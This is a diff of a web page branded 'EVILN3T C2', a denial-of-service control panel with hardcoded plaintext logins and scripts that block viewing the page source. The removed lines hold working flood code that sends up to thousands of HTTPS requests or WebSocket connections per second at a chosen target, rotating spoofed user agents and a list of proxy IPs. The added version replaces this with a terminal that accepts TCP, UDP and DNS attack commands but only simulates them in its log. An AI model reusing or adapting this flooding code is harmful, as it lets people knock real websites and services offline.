@@ -6,57 +6,118 @@
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>EVILN3T C2</title>
     <style>
-          body {
+        body {
             font-family: 'Courier New', Courier, monospace;
             margin: 0;
             padding: 0;
-            background-color: black ;
+            background-color: black;
             background-size: cover;
             background-position: center;
-            background-attachment: fixed; /* Fixes the background image */
-            
-            /* Black Background Option (Uncomment to use it) */
-            /* background-color: black;  Uncomment this line to use a black background instead */
-            
+            background-attachment: fixed;
             color: white;
             text-align: center;
             padding-top: 50px;
-            height: 100vh;
-            overflow: hidden;
+            height: 100%;
+            overflow: auto;
+            position: relative;
         }
 
-        h1 {
-            font-size: 60px;
-            color: red; /* Large and red welcome text */
+        /* Terminal Display */
+        #terminal {
+            width: 80%;
+            max-width: 1000px;
+            height: 400px;
+            margin: 50px auto; /* Centers the terminal */
+            padding: 20px;
+            color: yellow; /* Text color set to yellow */
+            font-size: 18px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            text-align: left; /* Align the text to the left */
+            background: none; /* No background */
+            border: none; /* No border */
+            box-shadow: none; /* No shadow */
         }
 
+        /* Command Input field at the top */
+        #commandInput {
+            background-color: black;
+            border: none;
+            color: yellow;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 18px;
+            width: 80%;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        /* Christmas Snowflakes */
+        @keyframes snowflakes {
+            0% { transform: translateY(-100px); }
+            100% { transform: translateY(100vh); }
+        }
+
+        .snowflake {
+            position: absolute;
+            top: -10px;
+            color: white;
+            font-size: 24px;
+            z-index: 9999;
+            animation: snowflakes 10s linear infinite;
+        }
+
+        .snowflake:nth-child(odd) {
+            animation-duration: 15s;
+            animation-timing-function: linear;
+        }
+
+        .snowflake:nth-child(even) {
+            animation-duration: 20s;
+            animation-timing-function: linear;
+        }
+
+        /* Neon border effect for logs */
+        #logContainer {
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.8);
+            color: yellow;
+            font-size: 18px;
+            max-height: 300px;
+            overflow-y: auto;
+            margin-top: 20px;
+        }
+
+        /* Login Form */
         .container {
             margin: 20px auto;
             width: 80%;
             max-width: 1000px;
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
         }
 
-        label {
-            display: inline-block;
-            margin-right: 10px;
-            font-weight: bold;
-            font-size: 18px;
-            color: #00cc99;
-            text-align: left;
-            border: 2px solid #00cc99;
-            padding: 10px;
-            border-radius: 5px;
+        .label-input-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 10px 0;
         }
 
-        .input-container input, .input-container select {
-            padding: 10px;
-            width: 300px;
-            font-size: 16px;
-            border: 2px solid #00cc99;
-            border-radius: 5px;
+        input[type="text"],
+        input[type="password"] {
             background-color: #333;
             color: white;
-            margin-bottom: 20px;
+            border: none;
+            padding: 10px;
+            width: 100%;
+            font-size: 16px;
+            margin-top: 10px;
+            border-radius: 5px;
         }
 
         .button {
@@ -69,193 +130,71 @@
             border-radius: 5px;
             margin-bottom: 20px;
         }
-
-        .button:hover {
-            background-color: #e65c00;
-        }
-
-        .status {
-            margin-top: 20px;
-            font-size: 18px;
-            color: cyan;
-        }
-
-        .logs {
-            max-height: 400px;
-            overflow-y: auto;
-            background-color: #333;
-            padding: 10px;
-            color: white;
-            font-size: 14px;
-            margin-top: 30px;
-            border-radius: 5px;
-        }
-
-        .log-entry {
-            padding: 5px;
-            margin: 5px 0;
-        }
-
-        .log-entry.start {
-            font-weight: bold;
-            color: green;
-        }
-
-        .log-entry.packet {
-            color: cyan;
-        }
-
-        .support-button {
-            background-color: #0088cc;
-            color: white;
-            padding: 15px 25px;
-            border: none;
-            font-size: 18px;
-            cursor: pointer;
-            border-radius: 5px;
-            margin-top: 20px;
-        }
-
-        .support-button:hover {
-            background-color: #006bb3;
-        }
-
-        .label-input-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin: 10px 0;
-        }
-
-        .label-input-container label {
-            width: 100%;
-            text-align: center;
-            margin-bottom: 5px;
-        }
-
-        .label-input-container input {
-            width: 80%;
-            text-align: center;
-        }
-
-        .transit-text {
-            font-size: 20px;
-            color: yellow;
-            margin-top: 20px;
-            font-weight: bold;
-        }
-
-        .name-display {
-            text-align: center;
-            font-size: 24px;
-            font-weight: bold;
-            color: #ff6600;
-            margin-top: 20px;
-        }
-
-        .url-input-container input {
-            background-color: black;
-            color: orange;
-            border: 2px solid orange;
-            border-radius: 5px;
-            font-size: 16px;
-            padding: 10px;
-            width: 80%;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .url-input-container button {
-            background-color: black;
-            color: orange;
-            padding: 15px 25px;
-            border: 2px solid orange;
-            font-size: 18px;
-            cursor: pointer;
-            border-radius: 5px;
-            margin-top: 20px;
-        }
-
-        .url-input-container button:hover {
-            background-color: orange;
-            color: black;
-        }
     </style>
 </head>
 <body>
-    <h1>Welcome To EVILN3T C2</h1>
+
+    <!-- Snowflakes -->
+    <div class="snowflake" style="left: 10%;">❄</div>
+    <div class="snowflake" style="left: 20%;">❄</div>
+    <div class="snowflake" style="left: 30%;">❄</div>
+    <div class="snowflake" style="left: 40%;">❄</div>
+    <div class="snowflake" style="left: 50%;">❄</div>
+    <div class="snowflake" style="left: 60%;">❄</div>
+    <div class="snowflake" style="left: 70%;">❄</div>
+    <div class="snowflake" style="left: 80%;">❄</div>
+    <div class="snowflake" style="left: 90%;">❄</div>
 
     <!-- Login Form -->
-    <div id="loginForm" class="login-container">
-        <h2 class="glitch" data-text="Please Login">Please Login</h2>
+    <div id="loginPage" class="container">
         <div class="label-input-container">
-            <label for="username">Username</label>
-            <input type="text" id="username" placeholder="Enter your username" />
+            <input type="text" id="username" placeholder="Enter Username">
         </div>
-
         <div class="label-input-container">
-            <label for="password">Password</label>
-            <input type="password" id="password" placeholder="Enter your password" />
+            <input type="password" id="password" placeholder="Enter Password">
         </div>
-
         <button class="button" onclick="login()">Login</button>
-        <p id="loginError" style="color: red;"></p>
-
-        <a href="https://t.me/eviln3t" target="_blank">
-            <button class="support-button">Support</button>
-        </a>
     </div>
 
     <!-- Main Content (hidden initially) -->
     <div id="mainContent" class="container" style="display: none;">
-        <div class="label-input-container">
-            <select id="attackType">
-                <option value="HTTPS">Attack URL (HTTPS)</option>
-                <option value="TCP">Attack IP (TCP)</option>
-            </select>
+        <div id="logContainer">
+            <!-- Logs will be added dynamically via JS -->
         </div>
 
-        <div class="url-input-container">
-            <input type="text" id="targetInput" placeholder="Enter URL/IP to attack">
-            <button class="button" onclick="startAttack()">Start Attack</button>
-        </div>
-
-        <div class="label-input-container">
-            <input type="number" id="portInput" placeholder="Enter Port Number" value="80">
-        </div>
-
-        <div class="label-input-container">
-            <input type="number" id="requestRateInput" placeholder="Enter Request Rate per Second" value="10000">
-        </div>
-
-        <div class="logs" id="logs"></div>
+        <!-- Command Input field (now at the top) -->
+        <input type="text" id="commandInput" placeholder="Type command" onkeydown="handleCommand(event)"><br>
     </div>
 
     <script>
         const users = {
-            'paradox': 'paradox',
-            'disc': 'omar',
-            'zenex' : 'zenex'
+            "ckd": "ckd",
+            "zenex": "gift1",
+            "evilnet": "pass22"
         };
 
-        const proxies = [
-            "http://107.162.143.146:80",
-            "http://58.246.58.150:9002",
-            "http://103.247.21.225:2024",
-            "http://51.254.78.223:80",
-            "http://198.49.68.80:80",
-            "http://123.30.154.38:2008",
-            "http://80.249.112.162:80",
-            "http://221.6.139.190:9002",
-            "http://123.30.154.171:7777",
-            "http://103.119.55.232:10001",
-            "http://185.255.123.34:80"
-        ];
+        let currentUser = "";
+        let attackTimer = null;
 
-        function getRandomProxy() {
-            return proxies[Math.floor(Math.random() * proxies.length)];
+        // Function to handle login
+        function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (users[username] && users[username] === password) {
+                currentUser = username;
+                // Clear the terminal content
+                const terminal = document.getElementById('logContainer');
+                terminal.textContent = ''; // Clear the logs
+                document.getElementById('loginPage').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
+                log('Login Successful', `Welcome, ${username}!`);
+            } else {
+                alert('Invalid username or password.');
+            }
         }
 
+        // Block "view page source"
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
         });
@@ -263,216 +202,63 @@
         document.addEventListener('keydown', function(e) {
             if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
                 e.preventDefault();
-            }
-            if (e.key === 'F12') {
-                e.preventDefault();
+                alert('WTF BOY YOU TRY TO SHOW SOURCE COD ????');
             }
         });
 
-        function login() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+        // Function to handle commands in terminal
+        function handleCommand(event) {
+            if (event.key === 'Enter') {
+                const command = document.getElementById('commandInput').value.trim();
+                document.getElementById('commandInput').value = ''; // Clear the input field
 
-            if (users[username] && users[username] === password) {
-                document.getElementById('loginForm').style.display = 'none';
-                document.getElementById('mainContent').style.display = 'block';
-                document.getElementById('loginError').textContent = '';
-            } else {
-                document.getElementById('loginError').textContent = 'Incorrect Password';
-                document.getElementById('loginError').classList.add('error-message');
-            }
-        }
-
-        function startAttack() {
-            const attackType = document.getElementById('attackType').value;
-            const target = document.getElementById('targetInput').value;
-            const port = document.getElementById('portInput').value;
-            const requestRate = document.getElementById('requestRateInput').value;
-
-            if (!target || !port || !requestRate) {
-                alert('Please fill out all fields.');
-                return;
-            }
-
-            logMessage(`Attacking started on ${attackType === 'HTTPS' ? 'URL' : 'IP'}: ${target}:${port}`);
-
-            if (attackType === 'HTTPS') {
-                logMessage(`Starting HTTPS attack on URL: ${target}:${port}`);
-                startHttpsAttack(target, port, requestRate);
-            } else if (attackType === 'TCP') {
-                logMessage(`Starting TCP attack on IP: ${target}:${port}`);
-                startTcpAttack(target, port, requestRate);
-            }
-        }
-
-        function startHttpsAttack(url, port, rate) {
-            const userAgents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
-    'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
-    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240',
-    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
-    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
-    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17',
-    'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4',
-    'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4',
-    'Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
-    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
-    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko',
-    'Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
-    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
-    'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
-    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
-    'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
-    'Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16',
-    'Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18',
-    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36'
-];
-
-
-            let count = 0;
-            let interval = setInterval(() => {
-                for (let i = 0; i < rate; i++) {
-                    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-                    const proxy = getRandomProxy(); 
-
-                    fetch(`https://${url}:${port}`, {
-                        method: 'GET',
-                        headers: {
-                            'User-Agent': randomUserAgent
-                        },
-                        proxy: proxy
-                    })
-                    .then(response => {
-                        logMessage(`Sent packet to: ${url}:${port}`);
-                    })
-                    .catch(error => {
-                        console.error('Error:', error);
-                    });
+                if (command.startsWith('TCP ')) {
+                    startAttack('TCP', command.slice(4));
+                } else if (command.startsWith('TSOCKET ')) {
+                    startAttack('TSOCKET', command.slice(8));
+                } else if (command.startsWith('HTTPS ')) {
+                    startAttack('HTTPS', command.slice(6));
+                } else if (command.startsWith('UDP ')) {
+                    startAttack('UDP', command.slice(4));
+                } else if (command.startsWith('DNS ')) {
+                    startAttack('DNS', command.slice(4));
+                } else if (command === 'info') {
+                    log('INFO', 'EVILN3T C2 | FOUNDER : RAY | SINCE : 2023');
+                } else if (command === 'ma') {
+                    log('INFO', 'NIK OMHOM ( lmoghriib )');
+                } else if (command === 'help') {
+                    log('HELP', 'Available commands: TCP <ip> <port>, TSOCKET <ip>, HTTPS <url>, UDP <ip> <port>, DNS <domain>, info, ma');
+                } else {
+                    log('ERROR', 'Invalid command');
                 }
-                count += rate;
+            }
+        }
+
+        // Function to simulate attack
+        function startAttack(type, target) {
+            const [targetIp, targetPort] = target.split(' ');
+
+            if (attackTimer) {
+                clearInterval(attackTimer); // Clear any previous attack
+            }
+
+            log('ATTACK', `[ATTACKING STARTED On ${targetIp}:${targetPort}]`);
+            let timeLeft = 60; // Default attack time: 60 seconds
+            attackTimer = setInterval(() => {
+                log('ATTACK', `${type} request sent to ${targetIp}:${targetPort}`);
+                timeLeft--;
+                if (timeLeft <= 0) {
+                    clearInterval(attackTimer);
+                    log('ATTACK', 'Attack finished');
+                }
             }, 1000);
         }
 
-        function startTcpAttack(ip, port, rate) {
-            const userAgents = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
-    'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
-    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240',
-    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
-    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
-    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17',
-    'Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4',
-    'Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4',
-    'Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
-    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
-    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko',
-    'Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
-    'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
-    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
-    'Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53',
-    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
-    'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
-    'Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16',
-    'Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6; rv:40.0) Gecko/20100101 Firefox/40.0',
-    'Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18',
-    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36'
-];
-
-
-            let count = 0;
-            let interval = setInterval(() => {
-                for (let i = 0; i < rate; i++) {
-                    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-                    let socket = new WebSocket(`ws://${ip}:${port}`);
-
-                    socket.onopen = () => {
-                        socket.send("GET / HTTP/1.1\r\nHost: " + ip + "\r\nUser-Agent: " + randomUserAgent + "\r\n\r\n");
-                        logMessage(`Sent packet to: ${ip}:${port}`);
-                    };
-
-                    socket.onerror = (error) => {
-                        console.error(`Error sending TCP packet to ${ip}:${port}`);
-                    };
-                }
-                count += rate;
-            }, 1000);
-        }
-
-        function logMessage(message) {
-            const logsContainer = document.getElementById('logs');
-            const logEntry = document.createElement('div');
-            logEntry.classList.add('log-entry');
-
-            if (message.includes('Attacking started')) {
-                logEntry.classList.add('start');
-            } else {
-                logEntry.classList.add('packet');
-            }
-
-            logEntry.textContent = message;
-            logsContainer.appendChild(logEntry);
-
-            logsContainer.scrollTop = logsContainer.scrollHeight;
+        // Function to log output in terminal
+        function log(type, message) {
+            const logContainer = document.getElementById('logContainer');
+            logContainer.textContent += `\n[${type}] ${message}`;
+            logContainer.scrollTop = logContainer.scrollHeight;
         }
     </script>
 </body>
